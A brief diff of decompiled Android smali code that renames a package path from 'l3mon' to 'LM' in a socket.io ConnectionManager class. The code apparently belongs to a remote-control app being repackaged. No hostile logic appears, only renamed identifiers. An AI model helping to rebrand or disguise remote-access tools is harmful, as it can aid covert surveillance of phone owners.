@@ -1,4 +1,4 @@
-.class final Lcom/etechd/l3mon/ConnectionManager$1;
+.class final Lcom/etechd/LM/ConnectionManager$1;
 .super Ljava/lang/Object;
 .source "ConnectionManager.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingMethod;
-    value = Lcom/etechd/l3mon/ConnectionManager;->sendReq()V
+    value = Lcom/etechd/LM/ConnectionManager;->sendReq()V
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -34,7 +34,7 @@
     .param p1, "args"    # [Ljava/lang/Object;
 
     .line 38
-    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->access$000()Lio/socket/client/Socket;
+    invoke-static {}, Lcom/etechd/LM/ConnectionManager;->access$000()Lio/socket/client/Socket;
 
     move-result-object v0
 
